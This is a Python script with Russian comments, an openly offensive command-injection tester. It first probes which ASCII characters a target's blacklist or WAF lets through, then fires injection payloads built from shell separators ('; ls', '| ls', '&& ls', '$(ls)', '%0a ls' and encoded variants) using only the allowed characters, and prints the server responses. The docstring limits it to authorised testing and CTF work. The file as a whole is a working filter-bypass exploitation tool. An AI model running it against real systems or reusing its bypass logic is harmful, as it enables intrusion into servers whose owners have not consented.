"""
=============================================================================
 2.F_proverka_simvol.py — Command Injection: карта фильтра символов + обход
=============================================================================

ЗАЧЕМ:
    Двухэтапный тестер command injection с прицелом на ОБХОД чёрных списков/WAF:
      1) test_chars() — берёт эталонный ответ на «нормальное» значение (напр.
         8.8.8.8), затем добавляет по одному все печатаемые ASCII-символы и
         смотрит, какие цель РЕЖЕТ. Детект блокировки: по строке-маркеру
         (напр. "hacker detect") или по резкому изменению длины ответа.
      2) test_commands() — пробует разделители команд (`; ls`, `| ls`, `&& ls`,
         `$(ls)`, `%0a ls`, `%26%26 ls`, ...) — но ТОЛЬКО те, чьи символы
         прошли фильтр на шаге 1. Экономит запросы и показывает рабочий вектор.

ГДЕ ПРИМЕНИМО:
    Параметр, предположительно уходящий в системную команду (ping/nslookup/
    конвертеры), защищённый чёрным списком символов. Нужно понять, что
    пропускается, и подобрать обходной разделитель.

ЗАПУСК:
    python3 2.F_proverka_simvol.py
    → ввести URL, имя параметра, базовое значение и (опц.) строку блокировки.

ЗАМЕЧАНИЯ:
    - Referer автоматически формируется с базовым payload (некоторые фильтры
      смотрят Referer). Тест идёт по GET.
    - Если строка блокировки не задана — эвристика по длине ответа (<0.8×эталон
      или полное совпадение = «возможно заблокирован»); возможны ложные выводы.
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
import string
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Для поддержки цветов в Windows
try:
    import colorama
    colorama.init()
except ImportError:
    pass

# ANSI коды цветов
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
ENDC = "\033[0m"
BOLD = "\033[1m"

banner = f"""
 _______         _______  _______  ______  _________        _______ _________ _______ 
(  ____ \       (  ____ \(       )(  __  \ \__   __/       (  ____ \\__   __/(       )
| (    \/       | (    \/| () () || (  \  )   ) (          | (    \/   ) (   | () () |
| (__           | |      | || || || |   ) |   | |          | (_____    | |   | || || |
|  __)          | |      | |(_)| || |   | |   | |          (_____  )   | |   | |(_)| |
| (             | |      | |   | || |   ) |   | |                ) |   | |   | |   | |
| )             | (____/\| )   ( || (__/  )___) (___       /\____) |___) (___| )   ( |
|/        _____ (_______/|/     \|(______/ \_______/ _____ \_______)\_______/|/     \|
         (_____)                                    (_____)                           
"""

print(banner)
# Ввод данных от пользователя
print(f"\n{BOLD}{CYAN}[*] Настройка теста Command Injection{ENDC}")
target_url = input(f"{BOLD}Введите целевой URL (например, 'http://target.com/index.php'): {ENDC}").strip()
param_name = input(f"{BOLD}Введите имя параметра для тестирования (например, 'ip' или 'cmd'): {ENDC}").strip()
base_payload = input(f"{BOLD}Введите базовое значение параметра (например, '8.8.8.8'): {ENDC}").strip()
blocked_string = input(f"{BOLD}Введите строку блокировки (например, 'hacker detect', или оставьте пустым): {ENDC}").strip()

# Автоматическая генерация заголовков
parsed_url = urlparse(target_url)
host_header = parsed_url.netloc
initial_params = parse_qs(parsed_url.query, keep_blank_values=True)

# Формирование Referer с базовым payload
initial_params[param_name] = [base_payload]
new_query = urlencode(initial_params, doseq=True)
referer_url = urlunparse((
    parsed_url.scheme,
    parsed_url.netloc,
    parsed_url.path,
    parsed_url.params,
    new_query,
    parsed_url.fragment
))

headers = {
    "Host": host_header,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": referer_url,
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

# Функция для отправки запроса
def send_request(payload_value):
    params = initial_params.copy()
    params[param_name] = [payload_value]
    try:
        return requests.get(
            target_url,
            params=params,
            headers=headers,
            timeout=10
        )
    except Exception as e:
        print(f"{RED}[-] Ошибка запроса: {str(e)}{ENDC}")
        return None

# Тестирование символов
def test_chars():
    print(f"\n{BLUE}{BOLD}[=== ТЕСТИРОВАНИЕ СИМВОЛОВ ===]{ENDC}")
    
    # Получаем эталонный ответ для базового payload
    print(f"{CYAN}[*] Получение эталонного ответа...{ENDC}")
    reference_response = send_request(base_payload)
    if reference_response is None:
        print(f"{RED}[-] Не удалось получить эталонный ответ. Проверьте базовый payload.{ENDC}")
        return [], []
    
    ref_length = len(reference_response.text)
    print(f"{GREEN}[+] Эталонная длина ответа: {ref_length} символов{ENDC}")
    
    tested_chars = []
    blocked_chars = []
    # Все печатные ASCII символы (кроме \r, \n, \t)
    chars = [chr(i) for i in range(32, 127)]  
    
    print(f"{CYAN}[*] Тестирование {len(chars)} символов...{ENDC}")
    for char in chars:
        test_payload = base_payload + char
        response = send_request(test_payload)
        if response is None:
            continue
            
        # Проверка блокировки
        if blocked_string:
            if blocked_string in response.text:
                print(f"{RED}[-] Заблокирован символ: {repr(char)[1:-1]} (код: {ord(char)}){ENDC}")
                blocked_chars.append(char)
            else:
                print(f"{GREEN}[+] Разрешённый символ: {repr(char)[1:-1]} (код: {ord(char)}){ENDC}")
                tested_chars.append(char)
        else:
            # Если строка блокировки не указана, сравниваем длину ответа
            if len(response.text) < 0.8 * ref_length or response.text == reference_response.text:
                print(f"{YELLOW}[-] Возможно заблокирован: {repr(char)[1:-1]} (код: {ord(char)}){ENDC}")
                blocked_chars.append(char)
            else:
                print(f"{GREEN}[+] Разрешённый символ: {repr(char)[1:-1]} (код: {ord(char)}){ENDC}")
                tested_chars.append(char)
    
    return tested_chars, blocked_chars

# Тестирование команд
def test_commands(allowed_chars):
    print(f"\n{BLUE}{BOLD}[=== ТЕСТИРОВАНИЕ КОМАНД ===]{ENDC}")
    
    # Полезные нагрузки для тестирования CMDi
    payloads = [
        "; ls",
        "%0a ls",
        "$(ls)",
        "'ls'",
        "& ls",
        "%26 ls",
        "&& ls",
        "%26%26 ls",
        "| ls",
        "|| ls"
    ]
    
    print(f"{CYAN}[*] Тестирование {len(payloads)} команд...{ENDC}")
    
    for payload in payloads:
        # Проверяем разрешены ли все символы в payload
        blocked_in_payload = [char for char in payload if char not in allowed_chars]
        
        if blocked_in_payload:
            blocked_chars_str = ", ".join(f"'{c}' (код {ord(c)})" for c in blocked_in_payload)
            print(f"\n{RED}[!] Пропуск payload '{payload}': заблокированные символы - {blocked_chars_str}{ENDC}")
            continue
            
        full_payload = base_payload + payload
        print(f"\n{GREEN}{BOLD}[+] Тестируем payload: {repr(payload)}{ENDC}")
        
        response = send_request(full_payload)
        if response is None:
            continue
            
        print(f"{CYAN}Статус код: {response.status_code}{ENDC}")
        print(f"{CYAN}Длина ответа: {len(response.text)} (эталон: {len(reference_response.text) if 'reference_response' in locals() else '?'}){ENDC}")
        print(f"{CYAN}Фрагмент ответа:{ENDC}")
        print(response.text[:500] + ("..." if len(response.text) > 500 else ""))

# Главная функция
def main():
    # Тестируем символы
    allowed_chars, blocked_chars = test_chars()
    
    print(f"\n{BOLD}{CYAN}[+] Результаты тестирования символов:{ENDC}")
    print(f"{GREEN}{BOLD}Разрешённые символы ({len(allowed_chars)}):{ENDC} {GREEN}{''.join(repr(c)[1:-1] for c in allowed_chars)}{ENDC}")
    print(f"{RED}{BOLD}Заблокированные символы ({len(blocked_chars)}):{ENDC} {RED}{''.join(repr(c)[1:-1] for c in blocked_chars)}{ENDC}")
    
    # Тестируем команды только если есть разрешённые символы
    if allowed_chars:
        test_commands(allowed_chars)
    else:
        print(f"\n{RED}[-] Нет разрешённых символов для тестирования команд{ENDC}")

if __name__ == "__main__":
    print(f"{BOLD}{CYAN}\n[*] Начало тестирования командной инъекции{ENDC}")
    main()
    print(f"{BOLD}{CYAN}\n[*] Тестирование завершено{ENDC}")
